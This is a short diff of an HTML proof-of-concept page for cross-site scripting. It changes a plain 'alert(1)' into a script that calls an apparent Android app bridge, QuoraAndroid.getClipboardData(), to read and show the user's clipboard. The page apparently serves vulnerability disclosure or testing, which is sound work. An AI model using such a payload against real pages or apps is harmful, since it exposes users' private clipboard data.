@@ -1,10 +1,10 @@
 <html><head><title>XSS</title></head>
 <body style="font-size:20px;font-family:monospace;background:#ffffcc;margin:8px">
 <div id="o">XSS PoC page</div>
-  <script>alert(QuoraAndroid.getClipboardData());</script>
+ 
 <script>
 /* canonical XSS proof-of-concept */
-alert(1);
+alert(QuoraAndroid.getClipboardData());
   
 
 /* after you press OK, the second dialog shows what the page could reach */
